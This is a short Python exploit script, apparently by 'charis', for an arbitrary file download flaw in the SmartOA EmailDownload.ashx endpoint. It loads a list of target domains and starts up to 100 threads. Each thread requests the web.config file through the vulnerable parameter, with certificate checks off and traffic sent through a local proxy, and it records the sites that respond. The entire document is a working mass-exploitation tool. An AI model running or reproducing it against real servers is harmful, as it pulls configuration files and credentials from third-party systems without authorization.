# 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞
# 作者 charis
import requests
import sys
import re
import time
from threading import Thread, enumerate
from requests.packages.urllib3.exceptions import InsecureRequestWarning

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        poc = f"/file/EmailDownload.ashx?url=~/web.config&name=web.config"
        urldata = url.strip("\n") + poc
        requests.packages.urllib3.disable_warnings()
        re = requests.get(urldata, headers=headers, proxies=proxies, verify=False)
        if re.text.find("<?") >= 0:
            print("[+]存在漏洞", urldata)
            s += urldata + "\n"
            with open("D:\\code\\python\\exp\\智明OA\\result.txt", "a", encoding="utf-8") as f:
                f.write(s)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\智明OA\\domain.txt", encoding="utf-8") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            time.sleep(1)